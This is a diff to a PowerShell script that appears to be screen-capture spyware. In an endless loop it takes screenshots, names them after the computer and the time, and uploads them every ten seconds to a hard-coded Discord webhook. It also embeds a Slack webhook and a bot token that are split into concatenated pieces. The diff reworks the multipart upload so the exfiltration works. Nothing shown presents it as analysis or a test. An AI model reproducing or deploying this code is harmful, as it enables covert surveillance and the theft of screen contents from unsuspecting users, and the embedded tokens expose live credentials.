@@ -2,6 +2,8 @@ $dwbt='https://discord.com/api/webhooks/10779346' + '36958744617/zh07WaxN4jLLI1Z
 $swbt='https://hooks.slack.com/services/T08F0' + '53J6G5/B08FXT4AHU0/MhBJ6ZQkjW5dzKwDi6yow9FB'
 $sat = "xoxb-8510173618549-855156999" + "8048-9VGiG8Blv8C7OABqVo9xP9m5"
 
+Add-Type -AssemblyName WindowsBase
+Add-Type -AssemblyName PresentationCore
 Add-Type @'
 using System;
 using System.Runtime.InteropServices;
@@ -45,8 +47,10 @@ while ($true) {
     $f = $m.ToArray()
 
     # Set up the multipart form-data
-    $boundary = "----WebKitFormBoundary7MA4YWxkTrZu0gW"
+    $boundary = [System.Guid]::NewGuid().ToString()
+    $lf = "`r`n"
     $fileName = "$env:COMPUTERNAME-$(Get-Date -Format HHmmss).png"
+    
     $body = @"
 --$boundary
 Content-Disposition: form-data; name="file"; filename="$fileName"
@@ -58,13 +62,31 @@ $f
     # Convert the body to byte array
     $bB = [System.Text.Encoding]::UTF8.GetBytes($body)
 
+    $pt1 = @{
+        "username" = "aa"
+        "content"  = "tt"
+    } | ConvertTo-Json -Compress
+    $q1t = (
+        "--$boundary",
+        "Content-Disposition: form-data; name=`"payload_json`"",
+        "Content-Type: application/json",
+        "",
+        $pt1,
+        "--$boundary",
+        "Content-Disposition: form-data; name=`"file`"; filename=`"$fileName`"",
+        "Content-Type: application/octet-stream",
+        "",
+        [System.Text.Encoding]::UTF8.GetString($f),
+        "--$boundary--"
+    ) -join $lf
+
     # Set the headers
     $headers = @{
         "Content-Type" = "multipart/form-data; boundary=$boundary"
     }
 
     # Send the HTTP request
-    Invoke-WebRequest -Uri $dwbt -Method Post -Headers $headers -Body $bB
+    irm -Uri $dwbt -Method Post -Headers $headers -Body $q1t
 
     # Wait for 10 seconds before the next iteration
     Start-Sleep -Seconds 10
